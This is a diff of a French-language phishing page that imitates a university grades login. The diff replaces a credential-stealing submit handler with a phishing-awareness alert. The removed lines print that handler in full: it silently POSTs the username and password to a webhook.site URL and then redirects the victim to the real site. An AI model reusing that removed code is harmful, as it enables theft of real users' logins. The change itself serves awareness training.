@@ -132,15 +132,15 @@
             Votre session a expiré, vous devez vous réauthentifier
         </div>
 
-        <form id="phishingForm">
+        <form id="demoForm">
             <div class="input-row">
                 <div class="icon-box">👤</div>
-                <input type="text" id="user" placeholder="Identifiant" required>
+                <input type="text" placeholder="Identifiant" required>
             </div>
 
             <div class="input-row">
                 <div class="icon-box">🔒</div>
-                <input type="password" id="pass" placeholder="Mot de passe" required>
+                <input type="password" placeholder="Mot de passe" required>
             </div>
 
             <div class="check-container">
@@ -149,7 +149,7 @@
 
             <div class="check-container">
                 <input type="checkbox"> 
-                <span>Faire confiance à ce navigateur</span>
+                <span>Faire confiance à ce navigateur lors des prochaines connexions</span>
             </div>
 
             <button type="submit" class="btn-submit">
@@ -164,33 +164,17 @@
 </div>
 
 <script>
-    document.getElementById('phishingForm').addEventListener('submit', function(e) {
-        e.preventDefault(); // Bloque l'envoi classique
+    document.getElementById('demoForm').addEventListener('submit', function(e) {
+        e.preventDefault(); // On ne change pas de page tout de suite
         
-        const userValue = document.getElementById('user').value;
-        const passValue = document.getElementById('pass').value;
-        const webhookUrl = "https://webhook.site/277897aa-a358-40ba-843d-fcba81e50cd2";
-
-        // Envoi des données en arrière-plan (invisible pour la victime)
-        fetch(webhookUrl, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: new URLSearchParams({
-                'identifiant': userValue,
-                'mot_de_passe': passValue
-            })
-        }).then(() => {
-            // Redirection immédiate vers les notes après l'envoi
-            window.location.href = "https://notes.iut-nfc.umlp.fr/";
-        }).catch(() => {
-            // En cas d'erreur réseau, on redirige quand même
-            window.location.href = "https://notes.iut-nfc.umlp.fr/";
-        });
-
-        // Sécurité : redirection forcée après 1 seconde si le réseau rame
-        setTimeout(function() {
-            window.location.href = "https://notes.iut-nfc.umlp.fr/";
-        }, 1000);
+        // Message de sensibilisation
+        alert("⚠️ ATTENTION : PHISHING DÉTECTÉ ! ⚠️\n\n" +
+              "Ceci est un exercice de sensibilisation.\n" +
+              "Si cette page était réelle, vos identifiants viendraient d'être volés.\n\n" +
+              "Conseil : Vérifiez toujours l'URL dans la barre d'adresse !");
+        
+        // Redirection vers le vrai site après le message
+        window.location.href = "https://notes.iut-nfc.umlp.fr/";
     });
 </script>
 
